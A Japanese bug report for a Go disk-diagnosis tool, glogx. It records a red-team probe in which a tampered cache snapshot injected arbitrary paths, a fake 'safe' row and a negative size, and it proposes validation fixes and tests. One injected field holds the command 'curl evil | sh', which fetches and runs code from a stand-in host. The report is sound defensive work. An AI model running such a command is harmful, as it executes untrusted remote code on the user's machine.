# 178 bug: snapshot を信用する境界が閉じておらず、書き換えた JSON の任意パスが行・コピー・再利用に載る (④ の前提)

起票日: 2026-09-02
重要度: **P1**
関連: [issues/163](163-audit-doctor-implementation-red-team.md) (体 5) / [issues/148](148-feat-glogx-doctor-disk-diagnosis.md) (「追記」の snapshot 再利用 / 「④ への追加要件」)

## 対象

`src/glogx/doctor_view.go` の `start` (snapshot 復元) / `doctorReuseFrom`、`src/glogx/doctor_cache.go` の
`loadDoctorSnapshot` / `loadDoctorSnapshotAny`

## なぜ P1 か

`doctor-snapshot.json` は一般ユーザー権限で書き換えられる。**今は削除機能が無いので実害は表示だけ**だが、
④ (削除) はこの画面の行を対象にする設計なので、**④ を実装する前にこの境界を確定しておかないと、
「キャッシュに書いた任意パスが削除対象になる」形が入りうる**。

## 実測 (体 5 の probe。偽 XDG_CACHE_HOME に細工した snapshot を置いた。実証済み)

### (a) TTL 内 (5 分以内) の snapshot は catalog を見ずに丸ごと表示される

- カタログに存在しない ID (`gone-id`) の Result がそのまま行になる: 「カタログから消えた ID … 4.7GB ✅ 安全」
- Items に書いた `/Users/koji/Documents` が Enter の詳細に出る。`y` を押すと
  `action=doctorCopyPath, payload=/Users/koji/Documents` が返る (= 任意パスがコピー経路に乗る)
- サービス節も snapshot 由来で出る。`⛔ evil` の `Commands` に書いた `curl evil | sh` が Enter の詳細に出る
- **snapshot 復元経路では全 Result の `Reused` が false**。「走査していない」ことを示すのは view の `snapshotAt` だけで、
  Result 側には痕跡が無い

### (b) TTL 切れ + 重いエントリの再利用でも任意パスが載る

`elapsed=10s` / `measured_at=1 分前` にした Result の Items.Path を `/Users/koji/Documents` にすると、
走査は走るがそのエントリは **`Reused=true` で Items がそのまま `Results` に載る**。
Entry (Label / risk) はカタログ側に差し替わるので**行は正規に見える**。新しい snapshot にも書き戻される。

### (c) 部分的に壊れた JSON の扱い

| ケース | load | 挙動 |
|---|---|---|
| `total` が文字列 / `results` が object / `elapsed` が文字列 / 末尾ゴミ | 失敗 | 走査に倒れる (良い) |
| 1 Result の `status` が未知の文字列 | 成功 | 行は出る (✅ 安全 + サイズ表示)。合計には入らない |
| `items` が null | 成功 | ok 扱い |
| `size` が負数 | 成功 | **「-5B 解放可能」と表示** |
| `measured_at` が 48 時間未来 | 成功 | TTL 内ならそのまま表示 (reuse 側は `age<0` で除外する) |

## 対応案

**④ の不変条件として issue 148 に書く (この issue の第一の成果物)**:

> 削除は必ず「再スキャン + `validateTarget`」を通した Result だけを対象にする。snapshot / キャッシュ由来の Path を
> 削除対象にしない。`Reused=true` の行と snapshot 復元中の行は、削除の前に必ず再スキャンする。

そのために今すぐ入れるもの:

1. snapshot 復元経路の Result に「走査していない」印を持たせる (`Reused=true` を立てるか、`FromSnapshot` を足す)。
   今は view の `snapshotAt` にしか無く、Result 単位では区別できない
2. 復元時にカタログに無い ID の Result を落とす (`doctorReuseFrom` と同じ規律に揃える)
3. 未知の `status` は「診断できず」に倒す (✅ 安全 と表示しない)
4. `size` が負数の Result を弾く
5. `measured_at` が未来の Result を復元経路でも弾く (`age<0`。reuse 側にはある = 非対称)

## 受け入れ条件

- [ ] ④ の不変条件が issue 148 に書かれている
- [ ] 1〜5 がテストで固定されている (細工した snapshot を食わせる probe テスト)
- [ ] 変異検証: 各ガードを外すと細工した値が行・コピー・合計に現れることを確認する
